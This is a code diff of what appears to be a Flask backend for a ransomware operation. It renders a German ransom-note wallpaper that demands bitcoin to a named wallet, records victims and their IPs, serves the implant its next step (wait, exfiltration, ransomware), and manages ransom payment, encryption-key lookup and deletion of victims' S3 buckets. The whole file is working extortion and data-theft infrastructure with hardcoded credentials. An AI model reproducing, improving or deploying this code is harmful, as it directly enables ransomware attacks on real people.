@@ -16,7 +16,7 @@ MINIO_ADMIN_SECRET = "minioadmin"
 def create_custom_wallpaper(id, username, ip):
     img = Image.new("RGB", (1920, 1080))
     font = ImageFont.truetype("./app/static/agency.ttf", 37)
-    text = f"Hallo {username},\n\nDein PC wurde nun von einer Ransomware befallen. Deine entsprechenden Daten wurden verschlüsselt und sind nicht mehr aufrufbar.\nUm wieder Zugriff zu erhalten musst Du 1 BTC (~25000 €) an folgendes BTC Wallet überweisen : bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\nNach Eingang der Zahlung werden Deine Daten wieder entschlüsselt.\n\nDeine IP zum Infektionszeitpunkt war die: {ip}\n\nBitte starte nach der Zahlung erneut die Blocky.exe und lasse die Software laufen, damit der Entschlüsselungsprozess stattfinden kann.\n\nVielen Dank.\nMit freundlichen Grüßen\n\nGerman Hacker"
+    text = f"Hallo {username},\n\nDein PC wurde nun von einer Ransomware befallen. Deine entsprechenden Daten wurden verschlüsselt und sind nicht mehr aufrufbar.\nUm wieder Zugriff zu erhalten musst Du 1 BTC (~38000 €) an folgendes BTC Wallet überweisen : bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd\nNach Eingang der Zahlung werden Deine Daten wieder entschlüsselt.\n\nDeine IP zum Infektionszeitpunkt war die: {ip}\n\nBitte starte nach der Zahlung erneut die ransom.exe in deinem Dokumente-Ordner und lasse die Software laufen, damit der Entschlüsselungsprozess stattfinden kann.\n\nVielen Dank.\nMit freundlichen Grüßen\n\nGerman Hacker"
 
     d = ImageDraw.Draw(img)
     d.text((10, 10), text, font=font, fill=(255, 0, 0))
@@ -117,7 +117,7 @@ def getencryptionkey(victim_id):
 
 
 # When called, writes the next malware step into the DB, so the victim can check for it
-# 0=wait, 1=exfiltration, 2=keylogger, 3=ransomware
+# 0=wait, 1=exfiltration, 2=ransomware
 @app.route("/sync/<int:victim_id>/set/<int:mode>", methods=["GET"])
 @auth.login_required
 def setSyncStatus(victim_id, mode):
@@ -128,7 +128,7 @@ def setSyncStatus(victim_id, mode):
 
 
 # Endpoint for next action for the malware
-# 0=wait, 1=exfiltration, 2=keylogger, 3=ransomware
+# 0=wait, 1=exfiltration, 2=ransomware
 @app.route("/sync/<int:victim_id>", methods=["GET"])
 def getSyncStatus(victim_id):
     victim = Victim.query.get(victim_id)
@@ -157,9 +157,25 @@ def checkStatus(victim_id):
 def receivePayment(victim_id):
     victim = Victim.query.get(victim_id)
     victim.payment_received = True
+    db.session.commit()
+    return redirect(url_for("displayIndex"))
+
+
+# When called, the specific victim has payed it's ransom and can be set as so in the DB
+# ex: curl -i -X POST http://rnsm-admin:rnsm@localhost:5000/paymentReceived/261153847923
+@app.route("/archiveVictim/<int:victim_id>", methods=["GET"])
+@auth.login_required
+def archiveVictim(victim_id):
+    victim = Victim.query.get(victim_id)
     victim.archived = True
     db.session.commit()
-    os.remove(f"./app/static/wp/{victim_id}.png")
+    # Remove wallpaper
+    os.remove(f"./app/static/wp/{victim.victim_id}.png")
+    # Remove S3 bucket
+    os.system(
+        f"mclient alias set rnsm-minio {MINIO_ADDRESS} {MINIO_ADMIN_KEY} {MINIO_ADMIN_SECRET}"
+    )
+    os.system(f"mclient rb --force rnsm-minio/{victim.s3_bucket}")
     return redirect(url_for("displayIndex"))
 
 
